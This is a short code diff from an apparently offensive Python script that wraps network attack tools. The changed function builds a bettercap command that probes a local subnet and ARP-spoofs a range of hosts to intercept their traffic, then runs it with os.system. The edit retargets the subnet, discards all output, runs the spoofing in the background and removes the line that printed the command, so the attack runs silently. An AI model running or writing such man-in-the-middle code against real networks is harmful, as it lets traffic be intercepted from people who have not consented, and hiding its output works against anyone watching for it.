@@ -32,9 +32,8 @@ def ettercap():
 
 def bettercap():
 	cmd = """ 
-	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.1.{}-{}; arp.spoof on"
+	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.0.{}-{}; arp.spoof on" > /dev/null 2> /dev/null  &
 	""".format(*IP_RANGE)
-	print(cmd)
 	os.system(cmd)
 	
 def mitmf():
